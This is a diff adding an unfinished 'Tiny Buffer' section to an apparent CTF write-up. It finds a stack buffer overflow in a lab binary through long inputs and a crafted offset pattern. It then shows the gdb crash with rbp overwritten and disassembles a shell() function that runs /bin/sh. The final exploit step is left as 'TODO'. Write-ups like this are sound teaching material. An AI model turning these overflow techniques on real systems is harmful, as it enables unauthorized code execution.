@@ -261,6 +261,78 @@ This script returns the flag: `SIG{1337_h4xx0r}`
 
 ## PWN
 
+### Tiny Buffer
+
+We have to find a buffer overflow in the binary. We can do so by just entering a random amount of characters when executing the binary until we crash: 
+```
+$ ./pwn1
+I sure hope noone calls shell()...
+Give me some input
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Alright you gave me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
+fish: Job 1, './pwn1' terminated by signal SIGSEGV (Address boundary error)
+```
+
+Nice! We can now try to the the minimum number of characters by repeating the same process. You'll notice that we can pass 32 characters without breaking the program. So what happens if we pass 40 or 48 characters? Let's find out.
+
+```
+$ python3 -c 'print("A" * 32 + "B" * 8 + "C" * 8)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+$ gdb ./pwn1
+(skipped)
+(gdb) r
+Starting program: /mnt/data/technical/ctf/sigflag-ctf/pwn/pwn1 
+I sure hope noone calls shell()...
+Give me some input
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+Alright you gave me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC�@
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400b82 in getinput ()
+```
+
+We can print all the registers with the `info registers` (short: `i r`) command:
+```
+(gdb) info registers
+rax            0x48                72
+rbx            0x4002e0            4195040
+rcx            0x4339c0            4405696
+rdx            0x6b4720            7030560
+rsi            0x7fffffff4750      140737488308048
+rdi            0x0                 0
+rbp            0x4242424242424242  0x4242424242424242
+rsp            0x7fffffff6de8      0x7fffffff6de8
+r8             0x6b6880            7039104
+r9             0x48                72
+r10            0xffffffffffffffff  -1
+r11            0x246               582
+r12            0x401770            4200304
+r13            0x401800            4200448
+r14            0x0                 0
+r15            0x0                 0
+rip            0x400b82            0x400b82 <getinput+92>
+eflags         0x10206             [ PF IF RF ]
+cs             0x33                51
+ss             0x2b                43
+```
+
+TODO
+
+
+
+```
+.text:0000000000400B83 shell           proc near
+.text:0000000000400B83 ; __unwind {
+.text:0000000000400B83                 push    rbp
+.text:0000000000400B84                 mov     rbp, rsp
+.text:0000000000400B87                 lea     rdi, aBinSh     ; "/bin/sh"
+.text:0000000000400B8E                 call    system
+.text:0000000000400B93                 nop
+.text:0000000000400B94                 pop     rbp
+.text:0000000000400B95                 retn
+.text:0000000000400B95 ; } // starts at 400B83
+```
+
 ## Crypto
 
 ## Web
